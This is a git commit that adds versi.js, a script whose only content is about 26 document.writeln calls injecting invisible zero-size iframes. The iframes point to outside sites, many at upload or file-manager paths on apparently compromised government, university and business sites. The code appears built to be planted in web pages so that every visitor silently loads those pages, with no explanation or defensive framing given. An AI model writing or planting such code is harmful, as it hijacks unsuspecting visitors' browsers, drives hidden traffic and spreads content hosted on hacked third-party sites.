01761f0326b5dfa85c04c2cbc1d8609293694eb3
IDTT <iddt1337@gmail.com>
2019-09-24 23:11:56 +0700

    Create versi.js

---
+++ versi.js
@@ -0,0 +1,28 @@
+<!-- 
+document.writeln(" <iframe src=\"https://api.skyplanners.com/\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"https://bookdomesticflights.com/local.html\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"http://packages.skyplanners.com/\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"https://www.skyplanners.com/\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"https://skyplanners.in/backend/\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"https://skysailings.com/main.html\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"https://asahankab.go.id/home/wp-content/languages/id_ID.mo.html\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"https://www.terabytes.com.ng/uploads/source/source/profile/profile.html\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"http://isphe.unnes.ac.id/laravel-filemanager/uploads/profile/profile.html\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"https://devicesmaintenance.com/uploads/profile/profile.html\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"https://wapa.asn.au/assets/uploads/profile/profile.html\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"http://pfionline.co.in/assets/user-img/profile/profile.html\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"http://www.mialegria.edu.co/source/profile/profile.html\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"https://www.nampinkshoes.com/media/upload/source/profile/profile.html\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"https://www.ankamar.net/assets/uploads/ckeditor/profile/profile.html\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"https://krw.nrct.go.th/file_managers/uploads/file_managers/source/profile/profile.html\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"https://rempc.by/ufiles//profile/profile.html\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"https://portalpalhoca.com.br/uploads/files/profile/profile.html\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"http://edurro.com/source/profile/profile.html\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"http://www.dailynayadiganta.com/resources/uploaded/profile/profile.html\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"https://www.banklumajang.com/js/uploadss/source/profile.html\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"http://www.studyplug.com/assets/files/profile/profile.html\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"http://www.losangelesdreamrentals.com/userfile/profile.html\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"https://www.macheene.com/public/editor/upload/users//profile/profile.html\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"https://www.forum-pemuda-ngadirejo.org/\" width=\"0%\" height=\"0\"></iframe> "); 
+document.writeln(" <iframe src=\"https://jquery-language-analytics.blogspot.com/\" width=\"0%\" height=\"0\"></iframe> ");
+ // -->
